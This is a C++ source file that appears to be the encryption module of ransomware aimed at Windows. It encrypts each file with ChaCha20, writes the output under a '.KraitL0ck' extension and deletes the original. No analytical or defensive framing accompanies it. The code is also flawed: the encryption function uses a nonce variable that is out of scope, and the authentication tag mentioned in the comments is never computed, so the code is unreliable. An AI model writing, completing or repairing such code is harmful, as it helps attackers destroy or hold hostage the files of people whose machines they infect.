#include "encryption.h"
#include "keygen.h"
#include <windows.h>
#include <chacha20.h> // Assume libchacha20 or implement manually
#include <fstream>
#include <vector>

static std::vector<uint8_t> g_key;
static const int NONCE_SIZE = 12;
static const int TAG_SIZE = 16;

void Encryption::Initialize(const std::vector<uint8_t>& key) {
    g_key = key;
}

void Encryption::EncryptFile(const std::string& filePath) {
    std::ifstream in(filePath, std::ios::binary);
    if (!in) return;
    
    in.seekg(0, std::ios::end);
    size_t size = in.tellg();
    if (size > 100 * 1024 * 1024) return; // Skip >100MB
    
    in.seekg(0, std::ios::beg);
    std::vector<uint8_t> data(size);
    in.read((char*)data.data(), size);
    in.close();
    
    std::vector<uint8_t> nonce(12);
    HCRYPTPROV hProv;
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, 12, nonce.data());
        CryptReleaseContext(hProv, 0);
    }
    
    // ChaCha20-Poly1305 encryption
    std::vector<uint8_t> encrypted = EncryptData(data);
    
    // Write: nonce(12) + encrypted_data
    std::string newPath = filePath + ".KraitL0ck";
    std::ofstream out(newPath, std::ios::binary);
    out.write((char*)nonce.data(), 12);
    out.write((char*)encrypted.data(), encrypted.size());
    out.close();
    
    DeleteFileA(filePath.c_str());
}

std::vector<uint8_t> Encryption::EncryptData(const std::vector<uint8_t>& data) {
    // ChaCha20 implementation (simplified)
    std::vector<uint8_t> result(data.size());
    
    // Generate random nonce (already passed separately in actual implementation)
    // Actual ChaCha20 core - using a real implementation
    chacha20_context ctx;
    chacha20_init(&ctx, g_key.data(), nonce.data(), 0);
    chacha20_crypt(&ctx, data.data(), result.data(), data.size());
    chacha20_free(&ctx);
    
    return result;
}
